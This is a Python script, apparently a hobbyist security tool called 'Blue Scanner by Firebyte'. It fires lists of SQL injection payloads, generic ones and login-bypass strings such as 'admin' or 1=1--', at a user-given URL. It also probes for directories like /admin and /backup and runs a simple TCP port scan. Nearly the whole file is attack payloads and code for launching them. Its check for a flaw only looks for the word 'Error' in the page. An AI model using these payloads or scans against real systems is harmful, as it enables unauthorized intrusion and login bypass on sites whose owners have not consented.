import requests
import socket
import sys
import signal

def generic_sql_injection_attack(url):
    # SQL injection payloads for generic SQL injection
    generic_payloads = [
        "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "' or \"", "-- or #", 
        "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '", "'='", "'LIKE'", 
        "'=0--+", " OR 1=1", "' OR 'x'='x", "' AND id IS NULL; --", "'''''''''''''UNION SELECT '2", 
        "%00", "/*…*/", "+", "||", "%", "@variable", "@@variable", 
        "AND 1", "AND 0", "AND true", "AND false", "1-false", "1-true", "1*56", "-2", 
        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+", 
        "1' ORDER BY 1,2--+", "1' ORDER BY 1,2,3--+", 
        "1' GROUP BY 1,2,--+", "1' GROUP BY 1,2,3--+", "' GROUP BY columnnames having 1=1 --", 
        "-1' UNION SELECT 1,2,3--+", "' UNION SELECT sum(columnname ) from tablename --", 
        "-1 UNION SELECT 1 INTO @,@", "-1 UNION SELECT 1 INTO @,@,@@", 
        "1 AND (SELECT * FROM Users) = 1", "' AND MID(VERSION(),1,1) = '5'", 
        "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --"
    ]

    for payload in generic_payloads:
        injected_url = url + "?query=" + payload
        response = requests.get(injected_url)

        if "Error" in response.text:
            print("Generic SQL Injection vulnerability detected with payload:", payload)
        else:
            print("No Generic SQL Injection vulnerability detected with payload:", payload)

def sql_auth_bypass_attack(url):
    # SQL injection payloads for authentication bypass
    auth_bypass_payloads = [
        "-", "'", " ", "&", "^", "*", " or ''-", " or '' ", " or ''&", " or ''^", " or ''*", 
        "-", " ", "&", "^", "*", " or \"\"-", " or \"\" ", " or \"\"&", " or \"\"^", " or \"\"*", 
        "or true--", " or true--", "' or true--", ") or true--", "') or true--", "' or 'x'='x", 
        "') or ('x')=('x", "')) or (('x'))=(('x", "\" or \"x\"=\"x", "\") or (\"x\")=(\"x", 
        "\")) or ((\"x\"))=(\"x", "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*", 
        "admin' --", "admin' #", "admin'/*", "admin' or '1'='1", "admin' or '1'='1'--", 
        "admin' or '1'='1'#", "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin' or 1=1", 
        "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1", 
        "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*", 
        "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#", "admin') or '1'='1'/*", 
        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", 
        "admin\" --", "admin\" #", "admin\"/*", "admin\" or \"1\"=\"1", "admin\" or \"1\"=\"1\"--", 
        "admin\" or \"1\"=\"1\"#", "admin\" or \"1\"=\"1\"/*", "admin\"or 1=1 or \"\"=\"", 
        "admin\" or 1=1", "admin\" or 1=1--", "admin\" or 1=1#", "admin\" or 1=1/*", 
        "admin\") or (\"1\"=\"1", "admin\") or (\"1\"=\"1\"--", "admin\") or (\"1\"=\"1\"#", 
        "admin\") or (\"1\"=\"1\"/*", "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"
    ]

    for payload in auth_bypass_payloads:
        injected_url = url + "?query=" + payload
        response = requests.get(injected_url)

        if "Error" in response.text:
            print("SQL Authentication Bypass vulnerability detected with payload:", payload)
        else:
            print("No SQL Authentication Bypass vulnerability detected with payload:", payload)

def hidden_directory_discovery(url):
    # Common directory names
    directories = [
        "admin",
        "secret",
        "backup"
    ]

    for directory in directories:
        directory_url = url + "/" + directory
        response = requests.get(directory_url)

        if response.status_code == 200:
            print("Hidden directory found:", directory_url)

def port_scanning(ip_address, ports):
    print("\nScanning for " + str(ip_address))
    for port in range(1, ports):
        scan_port(ip_address, port)

def scan_port(ip_address, port):
    try:
        sock = socket.socket()
        sock.connect((ip_address, port))
        print("✅  Port Opened " + str(port))
        sock.close()
    except:
        print("❌  Port Closed " + str(port))

def signal_handler(sig, frame):
    print('\nExiting the Blue Scanner by Firebyte...')
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)

    print("BLUE SCANNER by Firebyte")

    option = int(input("\nSelect an option:\n1. SQL Injection\n2. SQL Authentication Bypass\n3. Hidden Directory Discovery\n4. Port Scanning\nEnter option number: "))

    if option == 1:
        target_url = input("[*] Enter URL: ")
        generic_sql_injection_attack(target_url)
    elif option == 2:
        target_url = input("[*] Enter URL: ")
        sql_auth_bypass_attack(target_url)
    elif option == 3:
        target_url = input("[*] Enter URL: ")
        hidden_directory_discovery(target_url)
    elif option == 4:
        ip_address = input("[*] Enter the IP address for port scanning: ").strip()
        ports = int(input("[*] Enter the number of ports you want to scan: "))
        port_scanning(ip_address, ports)
    else:
        print("Invalid option.")

if __name__ == "__main__":
    main()
